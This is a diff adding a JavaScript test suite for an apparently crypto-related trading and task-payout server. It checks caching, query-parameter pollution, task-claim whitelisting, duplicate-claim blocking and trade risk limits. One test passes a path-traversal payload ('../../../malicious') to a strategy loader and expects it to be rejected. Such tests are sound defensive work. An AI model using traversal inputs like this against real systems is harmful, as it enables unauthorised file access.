+    delete require.cache[require.resolve("./routes/payoutRoutes.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+
+      // First request - should hit actual RPC checks and not be cached
+      const res1 = await fetch(`http://localhost:${port}/api/diagnostics/full`);
+      const firstResult = await res1.json();
+      expect(firstResult._cached).toBe(undefined);
+
+      // Second request - should be served from memory cache immediately
+      const res2 = await fetch(`http://localhost:${port}/api/diagnostics/full`);
+      const secondResult = await res2.json();
+      expect(secondResult._cached).toBe(true);
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+    }
+  });
+});
+
+describe("Server Endpoint Caching - Sentinel Hardening", () => {
+  it("validates that /api/market/prices handles symbols query parameter type pollution gracefully", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    Object.keys(require.cache).forEach(key => {
+      if (key.includes('payoutRoutes') || key.includes('payoutService') || key.includes('server.js')) {
+        delete require.cache[key];
+      }
+    });
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+
+      // Passing multiple symbols parameter triggers query parameter pollution / array representation
+      const res = await fetch(`http://localhost:${port}/api/market/prices?symbols=WETH&symbols=USDC`);
+      expect(res.status).toBe(400);
+      const data = await res.json();
+      expect(data.success).toBe(false);
+      expect(data.error).toBe('Invalid symbols parameter type');
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+    }
+  });
+
+  it("caches /api/status/connections results to prevent RPC spam", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    // Mock Express listen to capture the server instance and close it later
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    Object.keys(require.cache).forEach(key => {
+      if (key.includes('payoutRoutes') || key.includes('payoutService') || key.includes('server.js')) {
+        delete require.cache[key];
+      }
+    });
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+
+      // First request - should hit actual RPC checks and not be cached
+      const res1 = await fetch(`http://localhost:${port}/api/status/connections`);
+      const firstResult = await res1.json();
+      expect(firstResult._cached).toBe(undefined);
+
+      // Second request - should be served from memory cache immediately
+      const res2 = await fetch(`http://localhost:${port}/api/status/connections`);
+      const secondResult = await res2.json();
+      expect(secondResult._cached).toBe(true);
+    } finally {
+      // Restore listen and close server to prevent open handles from hanging tests
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+    }
+  });
+});
+
+describe("Task Claim Security & Whitelisting - Sentinel Hardening", () => {
+  it("rejects unauthorized taskId values", async () => {
+    const originalPort = process.env.PORT;
+    const originalSecret = process.env.TASK_CLAIM_SECRET;
+    process.env.PORT = "0";
+    process.env.TASK_CLAIM_SECRET = "test-secret-key-123";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    Object.keys(require.cache).forEach(key => {
+      if (key.includes('payoutRoutes') || key.includes('payoutService') || key.includes('server.js')) {
+        delete require.cache[key];
+      }
+    });
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+      const res = await fetch(`http://localhost:${port}/api/tasks/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          taskId: "invalid_unauthorized_task",
+          reward: 10,
+          userAddress: "0x9F407b7f793555c35c33aC64bd6901759470736D",
+          validationToken: "test-secret-key-123"
+        })
+      });
+      expect(res.status).toBe(400);
+      const data = await res.json();
+      expect(data.success).toBe(false);
+      expect(data.error).toBe("Invalid or unauthorized taskId requested");
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+      process.env.TASK_CLAIM_SECRET = originalSecret;
+    }
+  });
+
+  it("rejects duplicate task claims with 429 status", async () => {
+    const originalPort = process.env.PORT;
+    const originalSecret = process.env.TASK_CLAIM_SECRET;
+    process.env.PORT = "0";
+    process.env.TASK_CLAIM_SECRET = "test-secret-key-123";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    Object.keys(require.cache).forEach(key => {
+      if (key.includes('payoutRoutes') || key.includes('payoutService') || key.includes('server.js')) {
+        delete require.cache[key];
+      }
+    });
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+      const payload = {
+        taskId: "follow_twitter",
+        reward: 10,
+        userAddress: "0x9F407b7f793555c35c33aC64bd6901759470736D",
+        validationToken: "test-secret-key-123"
+      };
+
+      // First claim should succeed (or at least pass validation and return 200)
+      const res1 = await fetch(`http://localhost:${port}/api/tasks/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      expect(res1.status).toBe(200);
+      const data1 = await res1.json();
+      expect(data1.success).toBe(true);
+
+      // Second claim with same userAddress and taskId should be blocked with 429
+      const res2 = await fetch(`http://localhost:${port}/api/tasks/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      expect(res2.status).toBe(429);
+      const data2 = await res2.json();
+      expect(data2.success).toBe(false);
+      expect(data2.error).toBe("Task already claimed for this address");
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+      process.env.TASK_CLAIM_SECRET = originalSecret;
+    }
+  });
+
+  it("rejects unauthorized taskId values on routes/payoutRoutes", async () => {
+    const originalPort = process.env.PORT;
+    const originalSecret = process.env.TASK_CLAIM_SECRET;
+    const originalOracleKey = process.env.PAYOUT_PRIVATE_KEY;
+    process.env.PORT = "0";
+    process.env.TASK_CLAIM_SECRET = "test-secret-key-123";
+    process.env.PAYOUT_PRIVATE_KEY = "0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    Object.keys(require.cache).forEach(key => {
+      if (key.includes('payoutRoutes') || key.includes('payoutService') || key.includes('server.js')) {
+        delete require.cache[key];
+      }
+    });
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+      const res = await fetch(`http://localhost:${port}/api/v1/payouts/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          taskId: "invalid_unauthorized_task",
+          proofOfWork: "some-proof",
+          userAddress: "0x9F407b7f793555c35c33aC64bd6901759470736D",
+          validationToken: "test-secret-key-123"
+        })
+      });
+      expect(res.status).toBe(400);
+      const data = await res.json();
+      expect(data.error).toBe("Invalid or unauthorized taskId requested");
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+      process.env.TASK_CLAIM_SECRET = originalSecret;
+      process.env.PAYOUT_PRIVATE_KEY = originalOracleKey;
+    }
+  });
+
+  it("rejects duplicate task claims with 429 status on routes/payoutRoutes", async () => {
+    const originalPort = process.env.PORT;
+    const originalSecret = process.env.TASK_CLAIM_SECRET;
+    const originalOracleKey = process.env.PAYOUT_PRIVATE_KEY;
+    process.env.PORT = "0";
+    process.env.TASK_CLAIM_SECRET = "test-secret-key-123";
+    process.env.PAYOUT_PRIVATE_KEY = "0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    Object.keys(require.cache).forEach(key => {
+      if (key.includes('payoutRoutes') || key.includes('payoutService') || key.includes('server.js')) {
+        delete require.cache[key];
+      }
+    });
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+      const payload = {
+        taskId: "join_discord",
+        proofOfWork: "some-proof",
+        userAddress: "0x26fE35d19F481F376e862Aa70688a18Ae0237be5",
+        validationToken: "test-secret-key-123"
+      };
+
+      // First claim should succeed (using test mock/simulation signature payload)
+      const res1 = await fetch(`http://localhost:${port}/api/v1/payouts/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      expect(res1.status).toBe(200);
+      const data1 = await res1.json();
+      expect(data1.success).toBe(true);
+
+      // Second claim with same userAddress and taskId should be blocked with 429
+      const res2 = await fetch(`http://localhost:${port}/api/v1/payouts/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      expect(res2.status).toBe(429);
+      const data2 = await res2.json();
+      expect(data2.error).toBe("Task already claimed for this address");
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+      process.env.TASK_CLAIM_SECRET = originalSecret;
+      process.env.PAYOUT_PRIVATE_KEY = originalOracleKey;
+    }
+  });
+});
+
+describe("Strategy Loader Security & Path Traversal - Sentinel Hardening", () => {
+  it("rejects invalid/untrusted strategyId format in addCustomStrategy and removeCustomStrategy", async () => {
+    const loader = require("./strategies/loader");
+
+    // Test non-string input
+    let success = await loader.addCustomStrategy(123, {});
+    expect(success).toBe(false);
+
+    // Test path traversal payload
+    success = await loader.addCustomStrategy("../../../malicious", {
+      info: { name: "test", description: "test", version: "1.0.0" },
+      execute: () => {}
+    });
+    expect(success).toBe(false);
+
+    // Test null/undefined format
+    success = await loader.addCustomStrategy("test", null);
+    expect(success).toBe(false);
+
+    success = await loader.addCustomStrategy("test", undefined);
+    expect(success).toBe(false);
+  });
+
+  it("safely handles null or non-object in isValidStrategy", () => {
+    const loader = require("./strategies/loader");
+    expect(loader.isValidStrategy(null)).toBe(false);
+    expect(loader.isValidStrategy(undefined)).toBe(false);
+    expect(loader.isValidStrategy(123)).toBe(false);
+    expect(loader.isValidStrategy("not-an-object")).toBe(false);
+  });
+
+  it("successfully adds and removes custom strategy with valid strategyId", async () => {
+    const loader = require("./strategies/loader");
+    const strategyId = "sentinel_test_strategy";
+    const dummyStrategy = {
+      info: { name: "Sentinel Strategy", description: "Test", version: "1.0.0" },
+      execute: function(marketData, params) { return { signal: "HOLD", confidence: 0.5 }; },
+      toString: function() {
+        return `
+          module.exports = {
+            info: { name: "Sentinel Strategy", description: "Test", version: "1.0.0" },
+            execute: function(marketData, params) { return { signal: "HOLD", confidence: 0.5 }; }
+          };
+        `;
+      }
+    };
+
+    // Add strategy
+    const added = await loader.addCustomStrategy(strategyId, dummyStrategy);
+    expect(added).toBe(true);
+
+    // Verify it exists in strategies list
+    const strategies = loader.getStrategies();
+    expect(strategies[strategyId] !== undefined).toBe(true);
+
+    // Remove strategy
+    const removed = await loader.removeCustomStrategy(strategyId);
+    expect(removed).toBe(true);
+
+    // Verify it is removed
+    const strategiesAfter = loader.getStrategies();
+    expect(strategiesAfter[strategyId] === undefined).toBe(true);
+  });
+});
+
+describe("On-Chain Execution Engine & Worker", () => {
+  it("executes trades in dry-run mode and returns expected fields with null transactionHash", async () => {
+    const onchainEngine = require("./services/OnchainExecutionEngine");
+    const originalDryRun = process.env.DRY_RUN;
+    const originalKey = process.env.TRADING_PRIVATE_KEY;
+    process.env.DRY_RUN = "true";
+    delete process.env.TRADING_PRIVATE_KEY;
+
+    try {
+      const result = await onchainEngine.executeTrade({
+        botId: "test-bot",
+        fromToken: "USDC",
+        toToken: "WETH",
+        amount: 10,
+        slippageBps: 100
+      });
+
+      expect(result.success).toBe(true);
+      expect(result.mode).toBe("DRY_RUN");
+      expect(result.txHash).toBe(null);
+      expect(result.fromAmount).toBe(10);
+      expect(result.toAmount).toBe(9.9);
+    } finally {
+      process.env.DRY_RUN = originalDryRun;
+      if (originalKey) {
+        process.env.TRADING_PRIVATE_KEY = originalKey;
+      }
+    }
+  });
+
+  it("fails execution when calling with non-whitelisted assets", async () => {
+    const onchainEngine = require("./services/OnchainExecutionEngine");
+    try {
+      await onchainEngine.executeTrade({
+        botId: "test-bot",
+        fromToken: "INVALID",
+        toToken: "WETH",
+        amount: 10
+      });
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message.includes("Asset validation failed")).toBe(true);
+    }
+  });
+
+  it("enforces risk limits on large transaction sizes", async () => {
+    const onchainEngine = require("./services/OnchainExecutionEngine");
+    const originalDryRun = process.env.DRY_RUN;
+    const originalKey = process.env.TRADING_PRIVATE_KEY;
+    const originalMax = process.env.MAX_TRADE_USD;
+
+    process.env.DRY_RUN = "false";
+    process.env.TRADING_PRIVATE_KEY = "0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
+    process.env.MAX_TRADE_USD = "100";
+
+    try {
+      await onchainEngine.executeTrade({
+        botId: "test-bot",
+        fromToken: "USDC",
+        toToken: "WETH",
+        amount: 500
+      });
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message.includes("exceeds MAX_TRADE_USD")).toBe(true);
+    } finally {
+      process.env.DRY_RUN = originalDryRun;
+      if (originalKey) {
+        process.env.TRADING_PRIVATE_KEY = originalKey;
+      } else {
+        delete process.env.TRADING_PRIVATE_KEY;
+      }
+      process.env.MAX_TRADE_USD = originalMax;
+    }
+  });
+});
+
+
+async function run() {
+  let lastSuite = null;
+
+  for (const test of tests) {
+    if (test.suite !== lastSuite) {
+      lastSuite = test.suite;
+      console.log(`\n📋 ${lastSuite}`);
+    }
+
+    try {
+      await test.fn();
+      console.log(`   ✅ ${test.name}`);
+    } catch (error) {
+      testFailures += 1;
+      console.error(`   ❌ ${test.name}: ${error.message}`);
+    }
+  }
+
+  console.log("\n" + "=".repeat(50));
+  console.log("🧪 TRADE ARENA TEST SUITE");
+  console.log("=".repeat(50));
+
+  if (testFailures > 0) {
+    console.error(`❌ Test suite failed with ${testFailures} failure(s).`);
+    process.exit(1);
+  } else {
+    console.log("✅ Test suite passed with 0 failures.");
+    process.exit(0);
+  }
+
+  console.log("=".repeat(50) + "\n");
+}
+
+run().catch((error) => {
+  console.error("❌ Test runner failed:", error);
+  process.exit(1);
+});
